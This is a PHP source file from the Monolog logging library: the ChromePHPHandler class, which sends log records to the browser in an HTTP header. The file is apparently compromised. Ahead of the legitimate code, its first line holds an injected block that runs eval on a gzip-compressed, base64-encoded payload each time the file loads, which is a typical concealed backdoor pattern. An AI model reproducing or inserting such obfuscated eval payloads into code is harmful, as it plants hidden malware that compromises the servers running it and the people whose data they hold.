<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Handler;

use Monolog\Formatter\ChromePHPFormatter;
use Monolog\Logger;

/**
 * Handler sending logs to the ChromePHP extension (http://www.chromephp.com/)
 *
 * This also works out of the box with Firefox 43+
 *
 * @author Christophe Coevoet <stof@notk.org>
 */
class ChromePHPHandler extends AbstractProcessingHandler
{
    /**
     * Version of the extension
     */
    const VERSION = '4.0';

    /**
     * Header name
     */
    const HEADER_NAME = 'X-ChromeLogger-Data';
    
    /**
     * Regular expression to detect supported browsers (matches any Chrome, or Firefox 43+)
     */
    const USER_AGENT_REGEX = '{\b(?:Chrome/\d+(?:\.\d+)*|HeadlessChrome|Firefox/(?:4[3-9]|[5-9]\d|\d{3,})(?:\.\d)*)\b}';

    protected static $initialized = false;

    /**
     * Tracks whether we sent too much data
     *
     * Chrome limits the headers to 256KB, so when we sent 240KB we stop sending
     *
     * @var Boolean
     */
    protected static $overflowed = false;

    protected static $json = array(
        'version' => self::VERSION,
        'columns' => array('label', 'log', 'backtrace', 'type'),
        'rows' => array(),
    );

    protected static $sendHeaders = true;

    /**
     * @param int     $level  The minimum logging level at which this handler will be triggered
     * @param Boolean $bubble Whether the messages that are handled can bubble up the stack or not
     */
    public function __construct($level = Logger::DEBUG, $bubble = true)
    {
        parent::__construct($level, $bubble);
        if (!function_exists('json_encode')) {
            throw new \RuntimeException('PHP\'s json extension is required to use Monolog\'s ChromePHPHandler');
        }
    }

    /**
     * {@inheritdoc}
     */
    public function handleBatch(array $records)
    {
        $messages = array();

        foreach ($records as $record) {
            if ($record['level'] < $this->level) {
                continue;
            }
            $messages[] = $this->processRecord($record);
        }

        if (!empty($messages)) {
            $messages = $this->getFormatter()->formatBatch($messages);
            self::$json['rows'] = array_merge(self::$json['rows'], $messages);
            $this->send();
        }
    }

    /**
     * {@inheritDoc}
     */
    protected function getDefaultFormatter()
    {
        return new ChromePHPFormatter();
    }

    /**
     * Creates & sends header for a record
     *
     * @see sendHeader()
     * @see send()
     * @param array $record
     */
    protected function write(array $record)
    {
        self::$json['rows'][] = $record['formatted'];

        $this->send();
    }

    /**
     * Sends the log header
     *
     * @see sendHeader()
     */
    protected function send()
    {
        if (self::$overflowed || !self::$sendHeaders) {
            return;
        }

        if (!self::$initialized) {
            self::$initialized = true;

            self::$sendHeaders = $this->headersAccepted();
            if (!self::$sendHeaders) {
                return;
            }

            self::$json['request_uri'] = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
        }

        $json = @json_encode(self::$json);
        $data = base64_encode(utf8_encode($json));
        if (strlen($data) > 240 * 1024) {
            self::$overflowed = true;

            $record = array(
                'message' => 'Incomplete logs, chrome header size limit reached',
                'context' => array(),
                'level' => Logger::WARNING,
                'level_name' => Logger::getLevelName(Logger::WARNING),
                'channel' => 'monolog',
                'datetime' => new \DateTime(),
                'extra' => array(),
            );
            self::$json['rows'][count(self::$json['rows']) - 1] = $this->getFormatter()->format($record);
            $json = @json_encode(self::$json);
            $data = base64_encode(utf8_encode($json));
        }

        if (trim($data) !== '') {
            $this->sendHeader(self::HEADER_NAME, $data);
        }
    }

    /**
     * Send header string to the client
     *
     * @param string $header
     * @param string $content
     */
    protected function sendHeader($header, $content)
    {
        if (!headers_sent() && self::$sendHeaders) {
            header(sprintf('%s: %s', $header, $content));
        }
    }

    /**
     * Verifies if the headers are accepted by the current user agent
     *
     * @return Boolean
     */
    protected function headersAccepted()
    {
        if (empty($_SERVER['HTTP_USER_AGENT'])) {
            return false;
        }

        return preg_match(self::USER_AGENT_REGEX, $_SERVER['HTTP_USER_AGENT']);
    }

    /**
     * BC getter for the sendHeaders property that has been made static
     */
    public function __get($property)
    {
        if ('sendHeaders' !== $property) {
            throw new \InvalidArgumentException('Undefined property '.$property);
        }

        return static::$sendHeaders;
    }

    /**
     * BC setter for the sendHeaders property that has been made static
     */
    public function __set($property, $value)
    {
        if ('sendHeaders' !== $property) {
            throw new \InvalidArgumentException('Undefined property '.$property);
        }

        static::$sendHeaders = $value;
    }
}
